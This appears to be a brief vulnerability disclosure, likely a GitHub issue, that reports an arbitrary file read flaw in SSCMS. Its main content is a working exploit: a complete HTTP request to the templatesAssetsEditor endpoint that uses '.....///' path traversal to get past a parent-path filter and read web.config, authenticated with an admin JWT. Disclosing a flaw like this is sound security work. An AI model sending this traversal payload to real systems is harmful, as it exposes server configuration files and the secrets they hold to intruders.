SSCMS has an arbitrary file read vulnerability

![image-20250318164500-4e1tr8i](https://github.com/user-attachments/assets/3402e918-74f7-44bc-b904-9a7c35d85a02)


ReadTextAsynchronous is a file reading function.
Click on 'PathUtils' Removed ParentPath 'found filtering present

![image](https://github.com/user-attachments/assets/b8ce0fe7-6a44-41b7-ae74-67bc4b05c519)


But filtering can be bypassed

Then proceed with splicing...////// Read any file

exp:

```shell
GET /api/admin/cms/templates/templatesAssetsEditor?directoryPath=&fileName=.....///.....///.....///.....///.....///.....///www/sscms/web.config&fileType=html&siteId=1 HTTP/1.1
Host: 192.168.202.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6IkFkbWluaXN0cmF0b3IiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL2lzcGVyc2lzdGVudCI6IkZhbHNlIiwibmJmIjoxNzQyMjg5NjcxLCJleHAiOjE3NDIzNzYwNzEsImlhdCI6MTc0MjI4OTY3MX0.p0B6elCBkgsVoOO8AaW524HsKMceoGQBkvBh8zXVWCg
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

![image](https://github.com/user-attachments/assets/3cb81baa-0231-452a-baf8-1f6c4bb0ae9e)
